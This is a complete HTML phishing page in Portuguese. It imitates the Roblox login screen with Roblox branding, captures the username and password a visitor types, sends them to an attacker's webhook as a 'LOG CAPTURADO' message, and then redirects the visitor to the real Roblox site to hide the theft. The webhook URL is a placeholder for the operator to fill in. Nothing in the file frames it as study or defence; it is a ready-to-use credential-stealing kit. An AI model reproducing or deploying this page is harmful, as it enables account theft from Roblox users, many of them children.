<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            /* LINK ATUALIZADO PARA A GRADE DE JOGOS */
            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .login-box {
            background-color: #393b3d;
            padding: 40px 30px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            z-index: 2;
        }

        h1 {
            color: #fff;
            font-size: 32px;
            margin-bottom: 25px;
            font-weight: 700;
        }

        input {
            width: 100%;
            height: 45px;
            background-color: #191b1d;
            border: 1px solid #454749;
            border-radius: 4px;
            color: #fff;
            padding: 0 12px;
            margin-bottom: 15px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .btn-entrar {
            width: 100%;
            height: 45px;
            background-color: transparent;
            border: 1px solid #fff;
            color: #fff;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .links {
            color: #fff;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 15px;
        }

        .btn-secondary {
            width: 100%;
            height: 45px;
            background-color: #4f5153;
            border: none;
            color: #fff;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-box">
    <h1>Entrar na Roblox</h1>
    
    <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
    <input type="password" id="pass" placeholder="Senha">
    
    <button class="btn-entrar" onclick="send()">Entrar</button>
    
    <a href="#" class="links">Esqueceu a senha ou nome de usuário?</a>
    
    <button class="btn-secondary">Envie-me um código único por e-mail</button>
    <button class="btn-secondary">Entrada rápida</button>
    
    <p style="color: #fff; font-size: 14px; margin-top: 20px;">
        Não possui uma conta? <a href="#" style="color: #fff;">Cadastrar-se</a>
    </p>
</div>

<script>
    function send() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const webhook = "COLE_AQUI_SEU_WEBHOOK"; // <-- COLOQUE SEU WEBHOOK AQUI

        if(u && p) {
            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `🚨 **LOG CAPTURADO** 🚨\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\``
                })
            }).then(() => {
                window.location.href = "https://www.roblox.com/login";
            });
        }
    }
</script>

</body>
</html>
